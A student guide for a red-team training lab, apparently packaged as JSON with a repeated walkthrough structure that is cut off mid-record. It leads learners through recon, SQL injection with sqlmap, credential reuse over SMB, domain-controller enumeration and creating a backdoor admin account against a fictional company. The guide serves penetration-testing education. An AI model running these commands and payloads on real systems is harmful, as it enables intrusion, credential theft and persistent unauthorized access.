{
  "title": "Red Team Training Lab",
  "content_type": "student_guide",
  "body_markdown": "# Red Team Training Lab\n\n\nA comprehensive guide to penetration testing fundamentals covering reconnaissance, SQL injection, lateral movement, and domain compromise.\n\n\n## Reconnaissance\n\n\n### Understanding Your Position\n\n## Your Mission\n\nYou are a penetration tester hired to assess **Acme Widgets'** security. Your goal: gain Domain Admin access starting from outside the network.\n\n### Network Architecture\n\n```\nINTERNET (172.16.0.0/24)\n\u251c\u2500\u2500 kali (172.16.0.10)        \u2190 You are here\n\u2514\u2500\u2500 wordpress (172.16.0.100)  \u2190 Your initial target\n\nDMZ (172.16.1.0/24)\n\u2514\u2500\u2500 wordpress (172.16.1.10)   \u2190 Same server, internal IP\n\nINTERNAL (172.16.2.0/24)\n\u251c\u2500\u2500 fileserver (172.16.2.10)  \u2190 SMB File Server\n\u251c\u2500\u2500 ws01 (172.16.2.11)        \u2190 Employee Workstation\n\u2514\u2500\u2500 dc01 (172.16.2.12)        \u2190 Domain Controller\n```\n\n### First Steps\n\nOpen a terminal and check your IP address:\n\n```bash\nip addr show eth0\n```\n\n> You should see `172.16.0.10` - you're on the \"internet\" network.\n\n\n### Network Discovery\n\n## Discover Live Hosts\n\nLet's find what hosts are reachable from our position.\n\n```bash\n# Ping sweep - find live hosts\nnmap -sn 172.16.0.0/24\n```\n\n**What `-sn` does:** Host discovery only, no port scan. Fast and stealthy.\n\n### Expected Results\n\nYou should find:\n- `172.16.0.1` - Gateway\n- `172.16.0.10` - Your Kali box\n- `172.16.0.100` - **WordPress server** (your target!)\n\n\n### Service Enumeration\n\n## Enumerate the Target\n\nNow scan the WordPress server for open ports and services:\n\n```bash\nnmap -sV -sC 172.16.0.100\n```\n\n**Flags explained:**\n- `-sV` - Detect service versions\n- `-sC` - Run default NSE scripts\n\n### Expected Results\n\n| Port | Service | Notes |\n|------|---------|-------|\n| 22 | SSH | OpenSSH server |\n| 80 | HTTP | Apache web server |\n\n> **Next:** Let's explore that web application!\n\n\n## SQL Injection\n\n\n### Explore the Web App\n\n## Web Application Reconnaissance\n\nOpen Firefox and browse to the target:\n\n```\nhttp://172.16.0.100\n```\n\nOr use curl:\n```bash\ncurl -s http://172.16.0.100 | head -50\n```\n\n### What to Look For\n\n- Technology stack (WordPress, custom app?)\n- Login forms and search boxes\n- Links to other pages\n\n> **Hint:** Look for an **Employee Directory** page!\n\n\n### Find the Vulnerable Page\n\n## Directory Discovery\n\nLet's find hidden pages using gobuster:\n\n```bash\ngobuster dir -u http://172.16.0.100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt\n```\n\n### Expected Output\n\nYou should see several results including:\n\n```\n/wp-admin             (Status: 301)\n/wp-content           (Status: 301)\n/wp-includes          (Status: 301)\n/employees            (Status: 301)  \u2190 This looks interesting!\n```\n\n### Investigate the Finding\n\nNavigate to the discovered `/employees/` page:\n\n```\nhttp://172.16.0.100/employees/\n```\n\n### What Do You See?\n\n- A table of employees with names, departments, and contact info\n- A **search box** - user input is always interesting for attackers!\n- **Clickable employee names** - click on \"John Smith\" and notice the URL changes\n\nWhen you click an employee, the URL becomes:\n```\nhttp://172.16.0.100/employees/?employee_id=1\n```\n\nThis `employee_id` parameter is user-controllable input - a potential injection point!\n\n\n### Understanding SQL Injection\n\n## What is SQL Injection?\n\nSQL Injection (SQLi) occurs when user input is inserted directly into a SQL query without proper sanitization. This allows attackers to manipulate the query's logic and access or modify data they shouldn't be able to reach.\n\n### How Does It Work?\n\nImagine a web application that looks up employee details with code like this:\n\n```php\n// VULNERABLE CODE - Never do this!\n$query = \"SELECT * FROM employees WHERE id = \" . $_GET['employee_id'];\n```\n\nWhen you visit `?employee_id=1`, the query becomes:\n```sql\nSELECT * FROM employees WHERE id = 1\n```\n\nBut what if you visit `?employee_id=1 OR 1=1`? The query becomes:\n```sql\nSELECT * FROM employees WHERE id = 1 OR 1=1\n```\n\nSince `1=1` is always true, this returns ALL employees instead of just one!\n\n### Why Is This Dangerous?\n\nWith SQL injection, attackers can:\n- **Read sensitive data** - Extract usernames, passwords, credit cards\n- **Bypass authentication** - Log in without valid credentials\n- **Modify data** - Change prices, delete records, add admin accounts\n- **Execute system commands** - On some databases, run OS commands\n\n### Boolean-Based Testing\n\nThe simplest way to test for SQLi is with boolean conditions:\n- `AND 1=1` - Always TRUE, query should work normally\n- `AND 1=2` - Always FALSE, query should return nothing\n\nIf the page behaves differently between these two, the input is being executed as SQL!\n\n\n### Test for SQL Injection\n\n## Testing for SQL Injection\n\nThe page has two potential injection points:\n1. The `search` parameter (search box)\n2. The `employee_id` parameter (employee detail links)\n\nClick on an employee name to see their details. Notice the URL changes to include `employee_id=1`.\n\n### Testing the employee_id Parameter\n\nThis numeric field is easier to exploit. We'll extract the employee's notes field to see the difference:\n\n```bash\n# Normal request - should show employee notes\ncurl -s \"http://172.16.0.100/employees/?employee_id=1\" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\\/strong> //'\n```\n\n**Expected output:** `IT admin, has server access`\n\nNow test with boolean SQL injection:\n\n```bash\n# Boolean true (1=1) - should still show notes (spaces URL-encoded as %20)\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20AND%201=1\" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\\/strong> //'\n```\n\n**Expected output:** `IT admin, has server access` (same as before)\n\n```bash\n# Boolean false (1=2) - should return NOTHING\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20AND%201=2\" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\\/strong> //'\n```\n\n**Expected output:** (empty - no output!)\n\n> **Different responses confirm SQL injection!** The injected SQL is being executed by the database.\n\n\n### Extract Data with SQLMap\n\n## Automated Exploitation\n\nSQLMap automates SQL injection attacks. Let's use it!\n\n### Step 1: Confirm the Vulnerability\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id --batch\n```\n\n`-p employee_id` tells SQLMap which parameter to test.\n\n### Step 2: List Databases\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id --dbs --batch\n```\n\n### Step 3: List Tables\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id -D wordpress --tables --batch\n```\n\n> Look for: `wp_acme_employees`\n\n\n### Dump the Credentials!\n\n## Extract Employee Data\n\nNow dump the employee table:\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" \\\n  -p employee_id -D wordpress -T wp_acme_employees --dump --batch\n```\n\n### CRITICAL FINDING\n\nThe output reveals **VPN credentials in plaintext**:\n\n| Employee | Username | Password |\n|----------|----------|----------|\n| John Smith | jsmith | Summer2024 |\n| Mary Williams | mwilliams | Welcome123 |\n| **Backup Service** | **svc_backup** | **Backup2024** |\n\n> **The service account is your ticket to the internal network!**\n\n\n## Lateral Movement\n\n\n### Test Credential Reuse\n\n## The Credential Reuse Attack\n\nEmployees and services often reuse passwords across systems. Let's test if `svc_backup` credentials from the WordPress database also work on the internal file server.\n\n### Understanding Credential Reuse\n\nThis is one of the most common attack vectors:\n1. Attacker compromises one system (WordPress database)\n2. Extracts credentials (svc_backup / Backup2024)\n3. Tests those credentials on other systems\n4. Gains access to additional resources\n\n### Method 1: Using Impacket (Recommended)\n\nImpacket is a powerful Python toolkit commonly used in penetration testing:\n\n```bash\nimpacket-smbclient 'svc_backup:Backup2024@172.16.2.10'\n```\n\nOnce connected, list available shares:\n```\n# shares\n```\n\n### Method 2: Using Standard smbclient\n\nAlternatively, use the standard Linux SMB client:\n\n```bash\n# List shares\nsmbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'\n```\n\n### Expected Shares\n\n| Share | Description |\n|-------|-------------|\n| public | Open to everyone |\n| **sensitive** | Restricted - but svc_backup has access! |\n| accounting | Financial documents |\n| IPC$ | Inter-process communication |\n\n> **The credentials work!** This confirms password reuse between systems.\n\n\n### Access the Sensitive Share\n\n## Exploring the File Server\n\nNow connect to the sensitive share and look for interesting files:\n\n```bash\nsmbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024'\n```\n\nOnce connected, list the contents:\n```\nsmb: \\> ls\n```\n\n### What Do You See?\n\nLook for files like:\n- `passwords.txt` - Password lists\n- `*.kdbx` - KeePass databases\n- `*.xlsx` - Excel files with data\n- `backup_*` - Backup scripts with hardcoded creds\n\n### Download Interesting Files\n\n```\nsmb: \\> get passwords.txt\n```\n\nExit the SMB session:\n```\nsmb: \\> exit\n```\n\n### Read the File\n\n```bash\ncat passwords.txt\n```\n\n> **What did you find?** Move to the next step to see the critical discovery!\n\n\n### The Domain Admin Password\n\n## Critical Discovery!\n\nThe `passwords.txt` file reveals emergency credentials:\n\n```\n=== ACME INTERNAL PASSWORD LIST ===\nDO NOT SHARE OUTSIDE IT DEPARTMENT\n\nServer Room Door: 4521\nWiFi Password: AcmeGuest2024\nVPN PSK: AcmeVPN2024\nBackup Encryption: BackupKey2024!\n\nDomain Admin (emergency): Adm1n2024\n```\n\n### What You've Found\n\n| Account | Password | Access Level |\n|---------|----------|--------------|\n| Administrator | Adm1n2024 | **DOMAIN ADMIN** |\n\n### Why This Matters\n\n- **Plaintext passwords** stored on a file share (terrible practice!)\n- **Domain Admin credentials** give you complete control of the network\n- This is a common finding in real penetration tests\n\n> **You now have the keys to the kingdom!**\n\nNext, we'll verify these credentials work on the Domain Controller.\n\n\n## Domain Compromise\n\n\n### Verify Domain Admin Credentials\n\n## Testing the Domain Admin Password\n\nYou found `Adm1n2024` in the passwords.txt file. Let's verify it actually works!\n\n### Test Authentication via SMB\n\n```bash\nsmbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'\n```\n\n**Expected output:** A list of shares including `sysvol` and `netlogon` - these are only visible to authenticated domain users.\n\n### Test RPC Authentication\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusername'\n```\n\n**Expected output:**\n```\nAccount Name: Administrator, Authority Name: ACMEWIDGETS\n```\n\n> **The credentials work!** You now have Domain Administrator access.\n\n\n### Enumerate the Domain\n\n## Mapping the Domain\n\nWith Domain Admin credentials, let's discover everything about this network.\n\n### List All Domain Users\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers'\n```\n\n**Expected output:** A list of all domain users with their RIDs (Resource IDs). You should see Administrator, jsmith, mwilliams, svc_backup, and others.\n\n### Get User Details\n\n```bash\n# Query a specific user by username\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser svc_backup'\n```\n\nNotice the **Description** field shows \"Backup service account\" - this reveals the account's purpose! Service accounts are often high-value targets.\n\n### Enumerate Domain Groups\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomgroups'\n```\n\n### Who's in Domain Admins?\n\n```bash\n# RID 512 = Domain Admins group\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'querygroupmem 512'\n```\n\n> **These enumeration skills transfer directly to Windows AD.** Master them here, use them everywhere.\n\n\n### Check Password Policy\n\n## Password Policy Enumeration\n\nUnderstanding the domain's password policy helps plan attacks like password spraying.\n\n### Get Domain Password Policy\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getdompwinfo'\n```\n\n**What to look for:**\n- **Minimum password length** - Short = weak passwords likely\n- **Password complexity** - Disabled = simple passwords\n- **Lockout threshold** - How many guesses before lockout?\n\n### Get Account Lockout Policy\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusrdompwinfo 500'\n```\n\n> **Why this matters:** If there's no lockout (or high threshold), you could spray passwords against all users. In this lab, you already have Domain Admin, but in real engagements this is valuable recon.\n\n\n### Prove Domain Control\n\n## Demonstrate Full Domain Access\n\nThe ultimate proof of domain compromise is accessing protected resources.\n\n### Access SYSVOL (Domain Admin Required)\n\nSYSVOL contains Group Policy objects. Only Domain Admins can write here:\n\n```bash\nsmbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'\n```\n\n### Access NETLOGON Share\n\n```bash\nsmbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024' -c 'ls'\n```\n\n### What This Proves\n\nSuccessfully accessing SYSVOL and NETLOGON confirms:\n- Your credentials are valid Domain Admin\n- You can read/write domain-wide configuration\n- You have the highest level of access in the domain\n\n> **Note:** The file server in this lab uses local authentication, not domain authentication. In a real Windows environment, Domain Admin would grant access to all domain-joined systems.\n\n\n### Create a Backdoor Account\n\n## Persistence: Adding a Backdoor\n\nA common post-exploitation technique is creating a hidden admin account for persistent access.\n\n### Create a New Domain User with Password\n\nThe `net rpc` command creates users with a password in one step:\n\n```bash\nnet rpc user add support 'P@ssw0rd123!' -U 'Administrator%Adm1n2024' -S 172.16.2.12\n```\n\n**Expected output:** `Added user 'support'.`\n\n### Verify the Account Exists\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers' | grep support\n```\n\n### Test the New Account\n\n```bash\nsmbclient -L //172.16.2.12 -U 'support%P@ssw0rd123!'\n```\n\nYou should see the share listing, confirming the account works!\n\n> **Attacker tradecraft:** Accounts named \"support\", \"svc_scanner\", or \"helpdesk\" blend in with legitimate accounts. Blue teams should alert on any new account creation.\n\n### Why This Matters\n\nWith Domain Admin access, attackers can:\n- \u2705 **Create new admin accounts** for persistence\n- \u2705 **Read/write any file** on domain systems\n- \u2705 **Access all user data** across the organization\n- \u2705 **Modify Group Policy** (in Windows AD)\n\n> **You now have complete domain control with a persistent backdoor!**\n\n\n## Post-Exploitation\n\n\n### LDAP Deep Dive\n\n## LDAP Enumeration\n\nLDAP provides more detailed information than RPC. Let's extract everything.\n\n> **Note:** Samba AD requires encrypted LDAP connections. We use `-ZZ` for StartTLS and `LDAPTLS_REQCERT=never` to accept self-signed certificates.\n\n### List All Users with Details\n\n```bash\nLDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'cn=Users,DC=acmewidgets,DC=local' \\\n  '(objectClass=user)' sAMAccountName description memberOf\n```\n\n### Find Service Accounts\n\nService accounts often have elevated privileges and weak passwords:\n\n```bash\nLDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'DC=acmewidgets,DC=local' \\\n  '(description=*service*)' sAMAccountName description\n```\n\n### Export Domain Admin Members\n\n```bash\nLDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'DC=acmewidgets,DC=local' \\\n  '(cn=Domain Admins)' member\n```\n\n> **Pro tip:** In real engagements, export this data to a file and analyze offline to find attack paths and high-value targets.\n\n\n### Skills That Transfer to Windows AD\n\n## What You Learned Applies Everywhere\n\nThis lab uses **Samba AD** (Linux-based), but the skills you practiced transfer directly to Windows Active Directory:\n\n| Skill | Works on Samba | Works on Windows |\n|-------|----------------|------------------|\n| SMB authentication | \u2705 | \u2705 |\n| RPC user/group enumeration | \u2705 | \u2705 |\n| LDAP queries | \u2705 | \u2705 |\n| Password policy checks | \u2705 | \u2705 |\n| Backdoor account creation | \u2705 | \u2705 |\n\n### Windows-Only Attacks (For Future Learning)\n\nWhen you encounter **Windows AD** in other labs or real engagements, you'll have additional options:\n\n- **DCSync** - Extract all password hashes from the domain\n- **PSExec/WMIExec** - Get remote shells on Windows machines\n- **Kerberoasting** - Crack service account passwords\n- **Pass-the-Hash** - Authenticate with NTLM hashes\n\nThese require Windows-specific protocols that Samba doesn't implement.\n\n> **Key takeaway:** Master the fundamentals here (enumeration, lateral movement, persistence) - they're the foundation for all AD attacks.\n\n\n### Mission Complete!\n\n## Attack Chain Summary\n\nCongratulations! Here's your complete attack path:\n\n```\n1. RECONNAISSANCE\n   \u2514\u2500\u2500 nmap discovered WordPress at 172.16.0.100\n       \u2514\u2500\u2500 Ports 22 (SSH), 80 (HTTP) open\n\n2. SQL INJECTION\n   \u2514\u2500\u2500 Employee Directory (/employees/)\n       \u2514\u2500\u2500 SQLi in employee_id parameter\n           \u2514\u2500\u2500 Extracted credentials:\n               - svc_backup / Backup2024\n\n3. LATERAL MOVEMENT\n   \u2514\u2500\u2500 Credential reuse on file server (172.16.2.10)\n       \u2514\u2500\u2500 svc_backup \u2192 sensitive share\n           \u2514\u2500\u2500 Found passwords.txt\n               \u2514\u2500\u2500 Domain Admin: Adm1n2024\n\n4. DOMAIN COMPROMISE\n   \u2514\u2500\u2500 Authenticated to DC01 (172.16.2.12)\n       \u2514\u2500\u2500 Enumerated all users and groups\n           \u2514\u2500\u2500 Checked password policies\n               \u2514\u2500\u2500 Created backdoor \"support\" account\n\n5. PERSISTENCE\n   \u2514\u2500\u2500 Backdoor account: support / P@ssw0rd123!\n       \u2514\u2500\u2500 Full domain access established\n```\n\n## Defensive Lessons\n\n| Vulnerability | Fix |\n|--------------|-----|\n| SQL Injection | Parameterized queries, input validation |\n| Plaintext passwords in files | Use a secrets manager (Vault, AWS Secrets) |\n| Password reuse | Unique passwords + MFA everywhere |\n| Sensitive files on shares | Proper ACLs, audit access |\n| No account creation alerts | Monitor for new accounts (SIEM) |\n| Service accounts with file access | Least privilege, no interactive logon |\n\n## Next Steps for Learning\n\n1. **Try attacking differently** - Can you get Domain Admin without using passwords.txt?\n2. **Blue team it** - How would you detect each attack step?\n3. **Expand your skills** - Try Kerberoasting, AS-REP roasting in Windows labs\n\n> **Remember:** Only use these techniques with explicit written authorization!\n",
  "walkthrough_data": {
    "title": "Red Team Training Lab",
    "description": "A comprehensive guide to penetration testing fundamentals covering reconnaissance, SQL injection, lateral movement, and domain compromise.",
    "content_type": "student_guide",
    "version": "1.0",
    "tags": [
      "red-team",
      "penetration-testing",
      "training"
    ],
    "phases": [
      {
        "id": "phase1",
        "name": "Reconnaissance",
        "steps": [
          {
            "id": "step1_1",
            "vm": "kali",
            "title": "Understanding Your Position",
            "content": "## Your Mission\n\nYou are a penetration tester hired to assess **Acme Widgets'** security. Your goal: gain Domain Admin access starting from outside the network.\n\n### Network Architecture\n\n```\nINTERNET (172.16.0.0/24)\n\u251c\u2500\u2500 kali (172.16.0.10)        \u2190 You are here\n\u2514\u2500\u2500 wordpress (172.16.0.100)  \u2190 Your initial target\n\nDMZ (172.16.1.0/24)\n\u2514\u2500\u2500 wordpress (172.16.1.10)   \u2190 Same server, internal IP\n\nINTERNAL (172.16.2.0/24)\n\u251c\u2500\u2500 fileserver (172.16.2.10)  \u2190 SMB File Server\n\u251c\u2500\u2500 ws01 (172.16.2.11)        \u2190 Employee Workstation\n\u2514\u2500\u2500 dc01 (172.16.2.12)        \u2190 Domain Controller\n```\n\n### First Steps\n\nOpen a terminal and check your IP address:\n\n```bash\nip addr show eth0\n```\n\n> You should see `172.16.0.10` - you're on the \"internet\" network.\n"
          },
          {
            "id": "step1_2",
            "vm": "kali",
            "title": "Network Discovery",
            "content": "## Discover Live Hosts\n\nLet's find what hosts are reachable from our position.\n\n```bash\n# Ping sweep - find live hosts\nnmap -sn 172.16.0.0/24\n```\n\n**What `-sn` does:** Host discovery only, no port scan. Fast and stealthy.\n\n### Expected Results\n\nYou should find:\n- `172.16.0.1` - Gateway\n- `172.16.0.10` - Your Kali box\n- `172.16.0.100` - **WordPress server** (your target!)\n"
          },
          {
            "id": "step1_3",
            "vm": "kali",
            "title": "Service Enumeration",
            "content": "## Enumerate the Target\n\nNow scan the WordPress server for open ports and services:\n\n```bash\nnmap -sV -sC 172.16.0.100\n```\n\n**Flags explained:**\n- `-sV` - Detect service versions\n- `-sC` - Run default NSE scripts\n\n### Expected Results\n\n| Port | Service | Notes |\n|------|---------|-------|\n| 22 | SSH | OpenSSH server |\n| 80 | HTTP | Apache web server |\n\n> **Next:** Let's explore that web application!\n"
          }
        ]
      },
      {
        "id": "phase2",
        "name": "SQL Injection",
        "steps": [
          {
            "id": "step2_1",
            "vm": "kali",
            "title": "Explore the Web App",
            "content": "## Web Application Reconnaissance\n\nOpen Firefox and browse to the target:\n\n```\nhttp://172.16.0.100\n```\n\nOr use curl:\n```bash\ncurl -s http://172.16.0.100 | head -50\n```\n\n### What to Look For\n\n- Technology stack (WordPress, custom app?)\n- Login forms and search boxes\n- Links to other pages\n\n> **Hint:** Look for an **Employee Directory** page!\n"
          },
          {
            "id": "step2_2",
            "vm": "kali",
            "title": "Find the Vulnerable Page",
            "content": "## Directory Discovery\n\nLet's find hidden pages using gobuster:\n\n```bash\ngobuster dir -u http://172.16.0.100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt\n```\n\n### Expected Output\n\nYou should see several results including:\n\n```\n/wp-admin             (Status: 301)\n/wp-content           (Status: 301)\n/wp-includes          (Status: 301)\n/employees            (Status: 301)  \u2190 This looks interesting!\n```\n\n### Investigate the Finding\n\nNavigate to the discovered `/employees/` page:\n\n```\nhttp://172.16.0.100/employees/\n```\n\n### What Do You See?\n\n- A table of employees with names, departments, and contact info\n- A **search box** - user input is always interesting for attackers!\n- **Clickable employee names** - click on \"John Smith\" and notice the URL changes\n\nWhen you click an employee, the URL becomes:\n```\nhttp://172.16.0.100/employees/?employee_id=1\n```\n\nThis `employee_id` parameter is user-controllable input - a potential injection point!\n"
          },
          {
            "id": "step_sqli_intro",
            "title": "Understanding SQL Injection",
            "content": "## What is SQL Injection?\n\nSQL Injection (SQLi) occurs when user input is inserted directly into a SQL query without proper sanitization. This allows attackers to manipulate the query's logic and access or modify data they shouldn't be able to reach.\n\n### How Does It Work?\n\nImagine a web application that looks up employee details with code like this:\n\n```php\n// VULNERABLE CODE - Never do this!\n$query = \"SELECT * FROM employees WHERE id = \" . $_GET['employee_id'];\n```\n\nWhen you visit `?employee_id=1`, the query becomes:\n```sql\nSELECT * FROM employees WHERE id = 1\n```\n\nBut what if you visit `?employee_id=1 OR 1=1`? The query becomes:\n```sql\nSELECT * FROM employees WHERE id = 1 OR 1=1\n```\n\nSince `1=1` is always true, this returns ALL employees instead of just one!\n\n### Why Is This Dangerous?\n\nWith SQL injection, attackers can:\n- **Read sensitive data** - Extract usernames, passwords, credit cards\n- **Bypass authentication** - Log in without valid credentials\n- **Modify data** - Change prices, delete records, add admin accounts\n- **Execute system commands** - On some databases, run OS commands\n\n### Boolean-Based Testing\n\nThe simplest way to test for SQLi is with boolean conditions:\n- `AND 1=1` - Always TRUE, query should work normally\n- `AND 1=2` - Always FALSE, query should return nothing\n\nIf the page behaves differently between these two, the input is being executed as SQL!\n"
          },
          {
            "id": "step2_3",
            "vm": "kali",
            "title": "Test for SQL Injection",
            "content": "## Testing for SQL Injection\n\nThe page has two potential injection points:\n1. The `search` parameter (search box)\n2. The `employee_id` parameter (employee detail links)\n\nClick on an employee name to see their details. Notice the URL changes to include `employee_id=1`.\n\n### Testing the employee_id Parameter\n\nThis numeric field is easier to exploit. We'll extract the employee's notes field to see the difference:\n\n```bash\n# Normal request - should show employee notes\ncurl -s \"http://172.16.0.100/employees/?employee_id=1\" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\\/strong> //'\n```\n\n**Expected output:** `IT admin, has server access`\n\nNow test with boolean SQL injection:\n\n```bash\n# Boolean true (1=1) - should still show notes (spaces URL-encoded as %20)\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20AND%201=1\" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\\/strong> //'\n```\n\n**Expected output:** `IT admin, has server access` (same as before)\n\n```bash\n# Boolean false (1=2) - should return NOTHING\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20AND%201=2\" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\\/strong> //'\n```\n\n**Expected output:** (empty - no output!)\n\n> **Different responses confirm SQL injection!** The injected SQL is being executed by the database.\n"
          },
          {
            "id": "step2_4",
            "vm": "kali",
            "title": "Extract Data with SQLMap",
            "content": "## Automated Exploitation\n\nSQLMap automates SQL injection attacks. Let's use it!\n\n### Step 1: Confirm the Vulnerability\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id --batch\n```\n\n`-p employee_id` tells SQLMap which parameter to test.\n\n### Step 2: List Databases\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id --dbs --batch\n```\n\n### Step 3: List Tables\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id -D wordpress --tables --batch\n```\n\n> Look for: `wp_acme_employees`\n"
          },
          {
            "id": "step2_5",
            "vm": "kali",
            "title": "Dump the Credentials!",
            "content": "## Extract Employee Data\n\nNow dump the employee table:\n\n```bash\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" \\\n  -p employee_id -D wordpress -T wp_acme_employees --dump --batch\n```\n\n### CRITICAL FINDING\n\nThe output reveals **VPN credentials in plaintext**:\n\n| Employee | Username | Password |\n|----------|----------|----------|\n| John Smith | jsmith | Summer2024 |\n| Mary Williams | mwilliams | Welcome123 |\n| **Backup Service** | **svc_backup** | **Backup2024** |\n\n> **The service account is your ticket to the internal network!**\n"
          }
        ]
      },
      {
        "id": "phase3",
        "name": "Lateral Movement",
        "steps": [
          {
            "id": "step3_1",
            "vm": "kali",
            "title": "Test Credential Reuse",
            "content": "## The Credential Reuse Attack\n\nEmployees and services often reuse passwords across systems. Let's test if `svc_backup` credentials from the WordPress database also work on the internal file server.\n\n### Understanding Credential Reuse\n\nThis is one of the most common attack vectors:\n1. Attacker compromises one system (WordPress database)\n2. Extracts credentials (svc_backup / Backup2024)\n3. Tests those credentials on other systems\n4. Gains access to additional resources\n\n### Method 1: Using Impacket (Recommended)\n\nImpacket is a powerful Python toolkit commonly used in penetration testing:\n\n```bash\nimpacket-smbclient 'svc_backup:Backup2024@172.16.2.10'\n```\n\nOnce connected, list available shares:\n```\n# shares\n```\n\n### Method 2: Using Standard smbclient\n\nAlternatively, use the standard Linux SMB client:\n\n```bash\n# List shares\nsmbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'\n```\n\n### Expected Shares\n\n| Share | Description |\n|-------|-------------|\n| public | Open to everyone |\n| **sensitive** | Restricted - but svc_backup has access! |\n| accounting | Financial documents |\n| IPC$ | Inter-process communication |\n\n> **The credentials work!** This confirms password reuse between systems.\n"
          },
          {
            "id": "step3_2",
            "vm": "kali",
            "title": "Access the Sensitive Share",
            "content": "## Exploring the File Server\n\nNow connect to the sensitive share and look for interesting files:\n\n```bash\nsmbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024'\n```\n\nOnce connected, list the contents:\n```\nsmb: \\> ls\n```\n\n### What Do You See?\n\nLook for files like:\n- `passwords.txt` - Password lists\n- `*.kdbx` - KeePass databases\n- `*.xlsx` - Excel files with data\n- `backup_*` - Backup scripts with hardcoded creds\n\n### Download Interesting Files\n\n```\nsmb: \\> get passwords.txt\n```\n\nExit the SMB session:\n```\nsmb: \\> exit\n```\n\n### Read the File\n\n```bash\ncat passwords.txt\n```\n\n> **What did you find?** Move to the next step to see the critical discovery!\n"
          },
          {
            "id": "step3_3",
            "vm": "kali",
            "title": "The Domain Admin Password",
            "content": "## Critical Discovery!\n\nThe `passwords.txt` file reveals emergency credentials:\n\n```\n=== ACME INTERNAL PASSWORD LIST ===\nDO NOT SHARE OUTSIDE IT DEPARTMENT\n\nServer Room Door: 4521\nWiFi Password: AcmeGuest2024\nVPN PSK: AcmeVPN2024\nBackup Encryption: BackupKey2024!\n\nDomain Admin (emergency): Adm1n2024\n```\n\n### What You've Found\n\n| Account | Password | Access Level |\n|---------|----------|--------------|\n| Administrator | Adm1n2024 | **DOMAIN ADMIN** |\n\n### Why This Matters\n\n- **Plaintext passwords** stored on a file share (terrible practice!)\n- **Domain Admin credentials** give you complete control of the network\n- This is a common finding in real penetration tests\n\n> **You now have the keys to the kingdom!**\n\nNext, we'll verify these credentials work on the Domain Controller.\n"
          }
        ]
      },
      {
        "id": "phase4",
        "name": "Domain Compromise",
        "steps": [
          {
            "id": "step4_1",
            "vm": "kali",
            "title": "Verify Domain Admin Credentials",
            "content": "## Testing the Domain Admin Password\n\nYou found `Adm1n2024` in the passwords.txt file. Let's verify it actually works!\n\n### Test Authentication via SMB\n\n```bash\nsmbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'\n```\n\n**Expected output:** A list of shares including `sysvol` and `netlogon` - these are only visible to authenticated domain users.\n\n### Test RPC Authentication\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusername'\n```\n\n**Expected output:**\n```\nAccount Name: Administrator, Authority Name: ACMEWIDGETS\n```\n\n> **The credentials work!** You now have Domain Administrator access.\n"
          },
          {
            "id": "step4_2",
            "vm": "kali",
            "title": "Enumerate the Domain",
